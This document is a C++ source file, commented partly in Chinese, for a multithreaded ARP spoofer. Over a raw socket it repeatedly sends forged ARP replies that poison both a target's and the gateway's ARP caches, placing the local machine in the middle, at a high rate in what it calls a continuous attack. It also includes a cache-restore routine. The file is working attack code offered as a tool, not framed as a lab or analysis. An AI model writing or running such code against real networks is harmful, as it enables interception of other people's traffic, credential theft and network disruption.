#include "arp_spoofer.h"
#include "utils.h"
#include <iostream>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>  // 添加ARP定义
#include <net/if.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <cstring>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <vector>
#include <chrono>

ARPSpoofer::ARPSpoofer(const std::string& interface) 
    : interface_(interface), raw_socket_(-1), total_packets_sent_(0), total_sessions_(0) {
    
    // 创建高性能线程池，使用CPU核心数
    size_t num_threads = std::thread::hardware_concurrency();
    if (num_threads == 0) num_threads = 4;  // 默认4个线程
    
    thread_pool_ = std::make_unique<HighPerformanceThreadPool>(num_threads);
    std::cout << "[ARP Spoofer] 已创建高性能线程池，线程数: " << num_threads << std::endl;
}

ARPSpoofer::~ARPSpoofer() {
    shutdown();
}

bool ARPSpoofer::initialize() {
    std::cout << "[ARP Spoofer] Initializing on interface " << interface_ << std::endl;
    
    if (!create_raw_socket()) {
        return false;
    }
    
    // 启动线程池
    thread_pool_->start();
    
    std::cout << "[ARP Spoofer] Initialized successfully with thread pool" << std::endl;
    return true;
}

void ARPSpoofer::shutdown() {
    std::cout << "[ARP Spoofer] Shutting down..." << std::endl;
    
    // 停止线程池
    if (thread_pool_) {
        thread_pool_->stop();
    }
    
    // 停止所有活跃会话
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    
    for (auto& [ip, session] : active_sessions_) {
        if (session && session->active) {
            session->active = false;
            if (session->spoof_thread && session->spoof_thread->joinable()) {
                session->spoof_thread->join();
            }
        }
    }
    active_sessions_.clear();
    
    if (raw_socket_ >= 0) {
        close(raw_socket_);
        raw_socket_ = -1;
    }
    
    std::cout << "[ARP Spoofer] Shutdown complete" << std::endl;
}

bool ARPSpoofer::start_spoofing(const std::string& target_ip, const std::string& gateway_ip,
                               const std::string& target_mac, const std::string& gateway_mac) {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    
    // 检查是否已经在欺骗这个目标
    if (active_sessions_.find(target_ip) != active_sessions_.end()) {
        std::cout << "[ARP Spoofer] Target " << target_ip << " already being spoofed" << std::endl;
        return true;
    }
    
    // 创建新的欺骗会话
    auto session = std::make_unique<SpoofSession>();
    session->target_ip = target_ip;
    session->target_mac = target_mac;
    session->gateway_ip = gateway_ip;
    session->gateway_mac = gateway_mac;
    session->active = true;
    session->packets_sent = 0;
    session->start_time = get_timestamp_ms();
    
    // 🔧 使用线程池分配任务，基于IP哈希到特定线程
    // 这确保每个IP总是由同一个线程处理，避免竞争
    bool task_assigned = thread_pool_->assign_ip_task(target_ip, 
        [this, target_ip, gateway_ip, target_mac, gateway_mac](const std::string& ip) {
            this->spoof_task_func(ip, gateway_ip, target_mac, gateway_mac);
        });
    
    if (!task_assigned) {
        std::cerr << "[ARP Spoofer] Failed to assign task to thread pool for " << target_ip << std::endl;
        return false;
    }
    
    active_sessions_[target_ip] = std::move(session);
    total_sessions_++;
    
    std::cout << "[ARP Spoofer] Started spoofing " << target_ip << " -> " << gateway_ip 
              << " (assigned to thread pool)" << std::endl;
    return true;
}

bool ARPSpoofer::stop_spoofing(const std::string& target_ip) {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    
    auto it = active_sessions_.find(target_ip);
    if (it == active_sessions_.end()) {
        return false;
    }
    
    // 停止欺骗会话
    auto& session = it->second;
    session->active = false;
    
    if (session->spoof_thread && session->spoof_thread->joinable()) {
        session->spoof_thread->join();
    }
    
    std::cout << "[ARP Spoofer] Stopped spoofing " << target_ip 
              << " (sent " << session->packets_sent << " packets)" << std::endl;
    
    active_sessions_.erase(it);
    return true;
}

bool ARPSpoofer::restore_arp(const std::string& target_ip, const std::string& gateway_ip,
                            const std::string& target_mac, const std::string& gateway_mac) {
    std::cout << "[ARP Spoofer] Restoring ARP for " << target_ip << std::endl;
    
    // 发送正确的ARP回复包恢复目标的ARP表
    bool success = true;
    
    // 恢复目标的网关记录
    for (int i = 0; i < 3; i++) {
        if (!send_arp_packet(gateway_ip, gateway_mac, target_ip, target_mac, ARPOP_REPLY)) {
            success = false;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    // 发送免费ARP包
    for (int i = 0; i < 2; i++) {
        if (!send_arp_packet(gateway_ip, gateway_mac, gateway_ip, "ff:ff:ff:ff:ff:ff", ARPOP_REPLY)) {
            success = false;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
    
    return success;
}

bool ARPSpoofer::create_raw_socket() {
    raw_socket_ = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (raw_socket_ < 0) {
        std::cerr << "[ARP Spoofer] Failed to create raw socket: " << strerror(errno) << std::endl;
        return false;
    }
    
    // 绑定到指定网卡
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_.c_str(), IFNAMSIZ - 1);
    
    if (ioctl(raw_socket_, SIOCGIFINDEX, &ifr) < 0) {
        std::cerr << "[ARP Spoofer] Failed to get interface index: " << strerror(errno) << std::endl;
        close(raw_socket_);
        raw_socket_ = -1;
        return false;
    }
    
    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family = AF_PACKET;
    addr.sll_protocol = htons(ETH_P_ARP);
    addr.sll_ifindex = ifr.ifr_ifindex;
    
    if (bind(raw_socket_, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "[ARP Spoofer] Failed to bind socket: " << strerror(errno) << std::endl;
        close(raw_socket_);
        raw_socket_ = -1;
        return false;
    }
    
    return true;
}

bool ARPSpoofer::send_arp_packet(const std::string& src_ip, const std::string& src_mac,
                                const std::string& dst_ip, const std::string& dst_mac,
                                uint16_t operation) {
    // 构造ARP包
    uint8_t packet[sizeof(struct ethhdr) + sizeof(struct ether_arp)];
    memset(packet, 0, sizeof(packet));
    
    // 以太网头
    struct ethhdr* eth_header = (struct ethhdr*)packet;
    
    // 解析MAC地址
    uint8_t src_mac_bytes[6], dst_mac_bytes[6];
    if (!parse_mac_address(src_mac, src_mac_bytes) || 
        !parse_mac_address(dst_mac, dst_mac_bytes)) {
        return false;
    }
    
    memcpy(eth_header->h_dest, dst_mac_bytes, 6);
    memcpy(eth_header->h_source, src_mac_bytes, 6);
    eth_header->h_proto = htons(ETH_P_ARP);
    
    // ARP头
    struct ether_arp* arp_header = (struct ether_arp*)(packet + sizeof(struct ethhdr));
    arp_header->arp_hrd = htons(ARPHRD_ETHER);
    arp_header->arp_pro = htons(ETH_P_IP);
    arp_header->arp_hln = 6;
    arp_header->arp_pln = 4;
    arp_header->arp_op = htons(operation);
    
    // 源MAC和IP
    memcpy(arp_header->arp_sha, src_mac_bytes, 6);
    uint32_t src_ip_addr, dst_ip_addr;
    if (!parse_ip_address(src_ip, &src_ip_addr) || 
        !parse_ip_address(dst_ip, &dst_ip_addr)) {
        return false;
    }
    memcpy(arp_header->arp_spa, &src_ip_addr, 4);
    
    // 目标MAC和IP
    memcpy(arp_header->arp_tha, dst_mac_bytes, 6);
    memcpy(arp_header->arp_tpa, &dst_ip_addr, 4);
    
    // 发送包
    ssize_t sent = send(raw_socket_, packet, sizeof(packet), 0);
    if (sent < 0) {
        std::cerr << "[ARP Spoofer] Failed to send ARP packet to " << dst_ip 
                  << ": " << strerror(errno) << " (errno: " << errno << ")" << std::endl;
        return false;
    } else if (sent != sizeof(packet)) {
        std::cerr << "[ARP Spoofer] Partial send: sent " << sent 
                  << " bytes, expected " << sizeof(packet) << " bytes" << std::endl;
        return false;
    }
    
    total_packets_sent_++;
    return true;
}

void ARPSpoofer::spoof_thread_func(const std::string& target_ip) {
    std::cout << "[ARP Spoofer] Spoof thread started for " << target_ip << std::endl;
    
    SpoofSession* session = nullptr;
    {
        std::lock_guard<std::mutex> lock(sessions_mutex_);
        auto it = active_sessions_.find(target_ip);
        if (it != active_sessions_.end()) {
            session = it->second.get();
        }
    }
    
    if (!session) {
        std::cerr << "[ARP Spoofer] Session not found for " << target_ip << std::endl;
        return;
    }
    
    // 获取本机MAC地址
    std::string local_mac = get_interface_mac();
    if (local_mac.empty()) {
        std::cerr << "[ARP Spoofer] Failed to get interface MAC" << std::endl;
        return;
    }
    
    while (session->active) {
        // 发送双向欺骗包
        // 1. 告诉目标：网关的MAC是我的MAC
        send_arp_packet(session->gateway_ip, local_mac, 
                       session->target_ip, session->target_mac, ARPOP_REPLY);
        
        // 2. 告诉网关：目标的MAC是我的MAC
        send_arp_packet(session->target_ip, local_mac,
                       session->gateway_ip, session->gateway_mac, ARPOP_REPLY);
        
        session->packets_sent += 2;
        
        // 等待间隔
        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
    }
    
    std::cout << "[ARP Spoofer] Spoof thread ended for " << target_ip << std::endl;
}

// 线程池任务函数 - 高性能版本，每个线程专门处理一组IP
void ARPSpoofer::spoof_task_func(const std::string& target_ip, const std::string& gateway_ip,
                                const std::string& target_mac, const std::string& gateway_mac) {
    
    std::string my_mac = get_interface_mac();
    if (my_mac.empty()) {
        std::cerr << "[ARP Spoofer] Failed to get interface MAC" << std::endl;
        return;
    }
    
    std::cout << "[ARP Spoofer] Starting continuous attack on " << target_ip 
              << " (Thread Pool Mode)" << std::endl;
    std::cout << "[ARP Spoofer] Attack params: target=" << target_ip 
              << ", gateway=" << gateway_ip << ", my_mac=" << my_mac 
              << ", target_mac=" << target_mac << ", gateway_mac=" << gateway_mac 
              << ", raw_socket=" << raw_socket_ << std::endl;
    
    auto start_time = std::chrono::steady_clock::now();
    auto last_stats_time = start_time;
    uint64_t packets_sent = 0;
    
    // 持续攻击循环
    while (true) {
        // 检查会话是否仍然活跃
        bool session_active = false;
        {
            std::lock_guard<std::mutex> lock(sessions_mutex_);
            auto it = active_sessions_.find(target_ip);
            if (it != active_sessions_.end() && it->second->active) {
                session_active = true;
            }
        }
        
        if (!session_active) {
            break;  // 会话已停止
        }
        
        // 发送双向ARP欺骗包
        // 1. 告诉目标：网关的MAC是我的MAC
        bool success1 = send_arp_packet(gateway_ip, my_mac, target_ip, target_mac, ARPOP_REPLY);
        
        // 2. 告诉网关：目标的MAC是我的MAC  
        bool success2 = send_arp_packet(target_ip, my_mac, gateway_ip, gateway_mac, ARPOP_REPLY);
        
        if (success1 && success2) {
            packets_sent += 2;
            total_packets_sent_.fetch_add(2);
            
            // 更新会话统计
            {
                std::lock_guard<std::mutex> lock(sessions_mutex_);
                auto it = active_sessions_.find(target_ip);
                if (it != active_sessions_.end()) {
                    it->second->packets_sent = packets_sent;
                }
            }
            
            // 前几次发送时输出调试信息
            if (packets_sent <= 10) {
                std::cout << "[ARP Spoofer] " << target_ip << " - Successfully sent packets " 
                          << (packets_sent - 1) << " & " << packets_sent << std::endl;
            }
        } else {
            std::cerr << "[ARP Spoofer] " << target_ip << " - Failed to send packets (success1=" 
                      << success1 << ", success2=" << success2 << ")" << std::endl;
        }
        
        // 短暂延迟（高频攻击）
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        
        // 每10秒输出一次统计信息
        auto now = std::chrono::steady_clock::now();
        auto stats_elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_stats_time).count();
        if (stats_elapsed >= 10) {
            auto total_elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (total_elapsed > 0) {
                std::cout << "[ARP Spoofer] " << target_ip << " - 已发送 " << packets_sent 
                          << " 个包，速率：" << (packets_sent / total_elapsed) << " pps" << std::endl;
            }
            last_stats_time = now;
        }
    }
    
    std::cout << "[ARP Spoofer] Stopped attacking " << target_ip 
              << " (Total packets: " << packets_sent << ")" << std::endl;
}

// 获取线程池统计信息
std::vector<size_t> ARPSpoofer::get_thread_pool_queue_sizes() const {
    if (thread_pool_) {
        return thread_pool_->get_queue_sizes();
    }
    return {};
}

double ARPSpoofer::get_thread_pool_completion_rate() const {
    if (thread_pool_) {
        return thread_pool_->get_completion_rate();
    }
    return 0.0;
}

std::string ARPSpoofer::get_interface_mac() {
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_.c_str(), IFNAMSIZ - 1);
    
    if (ioctl(raw_socket_, SIOCGIFHWADDR, &ifr) < 0) {
        return "";
    }
    
    return mac_to_string((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

bool ARPSpoofer::parse_mac_address(const std::string& mac_str, uint8_t* mac_bytes) {
    return string_to_mac(mac_str, mac_bytes);
}

bool ARPSpoofer::parse_ip_address(const std::string& ip_str, uint32_t* ip_addr) {
    struct in_addr addr;
    if (inet_aton(ip_str.c_str(), &addr) == 1) {
        *ip_addr = addr.s_addr;
        return true;
    }
    return false;
}

size_t ARPSpoofer::get_active_sessions_count() const {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    return active_sessions_.size();
}

std::vector<std::string> ARPSpoofer::get_active_targets() const {
    std::lock_guard<std::mutex> lock(sessions_mutex_);
    std::vector<std::string> targets;
    for (const auto& [ip, session] : active_sessions_) {
        if (session && session->active) {
            targets.push_back(ip);
        }
    }
    return targets;
}